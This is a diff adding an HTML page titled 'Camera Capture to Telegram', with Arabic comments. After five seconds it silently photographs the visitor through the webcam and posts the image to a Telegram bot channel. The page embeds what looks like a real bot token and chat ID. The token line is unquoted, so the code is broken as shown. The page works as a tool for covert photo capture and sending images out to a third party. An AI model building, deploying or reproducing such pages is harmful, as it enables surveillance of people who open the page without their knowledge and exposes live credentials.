@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture to Telegram</title>
+</head>
+<body>
+    <h1>Camera Capture</h1>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const telegramToken = 7194341216:AAHn_oZkjAyx7b-AYuRsBTGQKcdPoeni9TA; // ضع هنا التوكن الخاص بالبوت
+        const chatId = -1002426247987; // ضع هنا Chat ID الخاص بالقناة
+
+        // تشغيل الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((err) => {
+                console.error("Error accessing camera: ", err);
+            });
+
+        // التقاط صورة بعد 5 ثوانٍ وإرسالها
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى Base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // رفع الصورة إلى تليجرام
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData // الصورة Base64
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => console.log("Photo sent to Telegram!", response))
+            .catch(error => console.error("Error sending photo:", error));
+        }, 5000);
+    </script>
+</body>
+</html>
